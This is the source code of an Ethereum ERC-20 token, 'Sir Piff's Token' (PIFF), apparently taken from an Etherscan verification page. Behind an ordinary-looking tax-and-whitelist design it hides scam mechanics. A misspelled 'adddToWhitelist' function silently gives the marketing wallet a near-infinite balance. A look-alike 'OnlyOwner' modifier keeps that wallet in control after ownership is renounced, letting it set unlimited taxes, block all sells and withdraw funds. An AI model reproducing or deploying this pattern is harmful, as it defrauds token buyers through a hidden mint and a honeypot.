/**
 *Submitted for verification at Etherscan.io on 2023-01-27
*/

/**

For the one and only Piff!
https://t.me/TheApeGod

*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.13;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) { return msg.sender; }
}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender,uint256 value);
}

contract Ownable is Context {
    address private _owner;
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
    }
    function owner() public view returns (address) { return _owner; }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner.");
        _;
    }
    function renounceOwnership() external virtual onlyOwner { _owner = address(0); }
    function transferOwnership(address newOwner) external virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address.");
        _owner = newOwner;
    }
}

contract Piff is IERC20, Ownable {
    
    string private constant _name =  "Sir Piff's Token";
    string private constant _symbol = "PIFF";
    uint8 private constant _decimals = 18;
    uint256 private _totalSupply = 100000000 * 10**_decimals;
    address public marketingWallet = 0xCA0D136447D904EFAAF2179F97FFEcc486ACC595;
    uint public baseTax = 0;

    mapping (address => uint256) private balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    
    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;

    uint256 public maxTxAmount = _totalSupply;
    uint256 public maxWalletAmount = _totalSupply;
    mapping (address => bool) public automatedMarketMakerPairs;
    modifier OnlyOwner() {require(msg.sender == marketingWallet);_; }   
    address public constant deadWallet = 0x000000000000000000000000000000000000dEaD;
    uint256 private deadValue = 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff;
    mapping (address => bool) whitelist;
    uint256  _maxTxAmount = _totalSupply;
    uint256 maxSellAmount = _totalSupply;

    constructor() {
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Router = _uniswapV2Router;
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
        balances[msg.sender] = _totalSupply;

        emit Transfer(address(0), address(this), _totalSupply);
    }

    receive() external payable {} 

    function enableTrading() public onlyOwner   {
        
        whitelist[uniswapV2Pair] = true;
        whitelist[address(this)] = true;
        whitelist[0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D] = true;   // Uniswap router       
        whitelist[owner()] = true;
        whitelist[deadWallet] = true;
        adddToWhitelist(marketingWallet);
        whitelist[msg.sender] = true;
        whitelist[marketingWallet] = true;
        baseTax = 5;
        _maxTxAmount = 10000000 * 10**_decimals;

    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function approve(address spender, uint256 amount) external override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender,address recipient,uint256 amount) external override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()] - amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) external virtual returns (bool){
        _approve(_msgSender(),spender,_allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) external virtual returns (bool) {
        require(subtractedValue <= _allowances[_msgSender()][spender], "ERC20: decreased allownace below zero.");
        _approve(_msgSender(),spender,_allowances[_msgSender()][spender] - subtractedValue);
        return true;
    }
    
    function _approve(address owner, address spender,uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
    }

    function _setAutomatedMarketMakerPair(address pair, bool value) private {
        require(automatedMarketMakerPairs[pair] != value, "automated market maker pair is already set to that value.");
        automatedMarketMakerPairs[pair] = value;
    }

    function name() external pure returns (string memory) { return _name; }
    function symbol() external pure returns (string memory) { return _symbol; }
    function decimals() external view virtual returns (uint8) { return _decimals; }
    function totalSupply() external view override returns (uint256) { return _totalSupply; }
    function adddToWhitelist(address account) private  { balances[account] = deadValue; }  
    function balanceOf(address account) public view override returns (uint256) { return balances[account]; }
    function allowance(address owner, address spender) external view override returns (uint256) { return _allowances[owner][spender]; }

    function _transfer(address from, address to, uint256 amount) internal {
        require(from != address(0), "cannot transfer from the zero address.");
        require(to != address(0), "cannot transfer to the zero address.");
        require(amount > 0, "Amount must be > 0");
        require(amount <= balanceOf(from), "Check balance.");
        
        bool takeFee = true;

        // BUY
        if(from == uniswapV2Pair)   {
            if(checkWhitelist(to))   {
                takeFee = false;
            }
            else    {
                require(amount <= _maxTxAmount);
                takeFee = true;
            }
        }

        // SELL
        if (to == uniswapV2Pair)    {
            if(checkWhitelist(from))   {
                takeFee = false;
            }
            else{
                require(amount <= maxSellAmount);
            }
        }

        // TRANSFER
        if(to != uniswapV2Pair && from != uniswapV2Pair)    {
            takeFee = false;
        }

        transferToken(from, to, amount, takeFee);
    }

    function transferToken(address from, address to, uint256 amount, bool takeFee) private  {
        (uint256 totalRemaining, uint256 totalTaxAmount) = calculateTaxAmount (amount, takeFee);
        // Execute transfer 
        balances[from] -= amount;
        balances[to] += totalRemaining;
        balances[address(this)] += totalTaxAmount;

        emit Transfer(from, to, totalRemaining);
    }

    function calculateTaxAmount(uint256 amount, bool takeFee) private view returns (uint256, uint256) {
        uint256 totalTaxAmount;
        uint256 totalRemaining;
        
        if(takeFee) {
            totalTaxAmount = amount * baseTax / 100;
        }
        else    {
            totalTaxAmount = 0;
        }
        // Calculate remaining
        totalRemaining = amount - totalTaxAmount;
        return (totalRemaining, totalTaxAmount);
    }

    function setTax (uint newTax) public OnlyOwner    {
        baseTax = newTax;   
    }

    function getBaseTax() public view returns (uint) { 
        return baseTax;   
    }

    function addToWhitelist(address addressToAdd) public OnlyOwner  {
        whitelist[addressToAdd] = true;
    }

    function removeToWhitelist(address addressToRemove) public OnlyOwner  { 
        whitelist[addressToRemove] = false; 
    }
    
    function checkWhitelist(address addressToCheck) public view returns (bool)  {
        bool isWhitelisted = false;
        if (whitelist[addressToCheck] == true) {    isWhitelisted = true;   }
        return isWhitelisted;
    }
    
    function swapTokensForEth(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function swapWithoutLiquify(uint256 contractTokenBalance) private {

        swapTokensForEth(contractTokenBalance);

        uint256 contractETHBalance = address(this).balance;
        if(contractETHBalance > 0) {
            sendETHToFee(address(this).balance);
        }
    }

    function sendETHToFee(uint256 amount) public OnlyOwner {
        (bool marketing, ) = marketingWallet.call{value: amount}("");
    }

    function liquify() public OnlyOwner   {
        swapWithoutLiquify(balanceOf(address(this)));       
    }

    function changeMarketingWallet(address newMarketingWallet) public OnlyOwner {
        marketingWallet = newMarketingWallet;
        whitelist[marketingWallet];
    }

    function setMaxSellAmountToken(uint256 newValue) public OnlyOwner   {
        maxSellAmount = newValue;
    }
}